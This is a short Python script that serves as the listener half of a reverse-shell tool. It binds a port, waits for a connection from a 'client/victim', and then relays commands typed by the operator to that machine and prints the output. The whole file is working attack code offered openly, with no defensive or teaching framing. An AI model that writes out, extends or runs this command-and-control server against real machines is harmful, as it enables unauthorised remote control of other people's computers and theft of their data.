import socket
import sys

host = ""
port = 9999

#function for creating a socket 
def create_socket():
    global s
    try:
        s = socket.socket()
    except:
        print("Error: " + str(socket.error))

#function for binding the socket and port & host address / listening to connection
def bind_socket():
    global s
    try:
        print("Binding the port {} and the host {} with the socket".format(str(port),host))
        s.bind((host,port))
        s.listen(5)
    except:
        print("Error: " + str(socket.error) + "\n" + "Tryng again to bind!")
        bind_socket()

#function for establishing a connection with client (socket must be listening )
def accept_connection ():
    print("Accepting the connection!")
    connection,address  = s.accept()
    print("Connection established! IP: {} Port: {}".format(address[0],str(address[1])))
    send_commands(connection)

#send commands to a client/victim
def send_commands(connection):
    while True:
        cmd = input("Enter command: ")
        if cmd == "quit":
            connection.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            print("Sending the data over the connection!")
            connection.send(str.encode(cmd))
            print("Data received from the client: " + "\n")
            client_response_byte  = connection.recv(1024)
            client_response_str = client_response_byte.decode("utf-8")
            print(client_response_str, end="")

def main():
    create_socket()
    bind_socket()
    accept_connection()
main()